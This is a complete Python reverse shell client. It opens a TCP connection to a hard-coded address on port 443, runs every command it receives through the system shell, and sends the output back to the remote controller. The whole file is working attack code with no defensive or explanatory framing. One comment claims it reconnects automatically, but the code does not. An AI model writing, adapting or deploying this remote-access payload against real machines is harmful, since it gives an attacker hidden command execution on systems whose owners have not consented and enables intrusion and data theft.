#!/usr/bin/env python3

import socket
import subprocess

HOST = "192.168.100.138"
PORT = 443

def connect():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((HOST, PORT))
    client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    return client_socket

def run_command(cmd) -> bytes:
    cmd_output = subprocess.run(
        cmd,
        shell=True,
        capture_output=True,
        text=True,
    )
    return (cmd_output.stdout + cmd_output.stderr).encode() + b"<END_OF_RESPONSE>"

def recieve_data(client_socket) -> str:
    data = b""
    while True:
        chunk = client_socket.recv(4096)
        
        if chunk == b"":
            raise ConnectionError("Server closed connection")
            
        data += chunk
        if data.endswith(b"\n"):
            break

    return data.decode().strip()


if __name__ == "__main__":
    client_socket = None
    try:
        client_socket = connect() # loop infinito de reconectar si el servidor se desconectó
        while True:
            try:
                cmd = recieve_data(client_socket)
                if cmd.lower() in ("exit", "quit"):
                    break

                output_cmd = run_command(cmd)
                client_socket.sendall(output_cmd)
            except (ConnectionError, ConnectionResetError, BrokenPipeError):
                break
            except Exception as e:
                error_msg = f"[ERROR]: {e}".encode()
                client_socket.sendall(error_msg)
    finally:
        if client_socket is not None:
            client_socket.close()

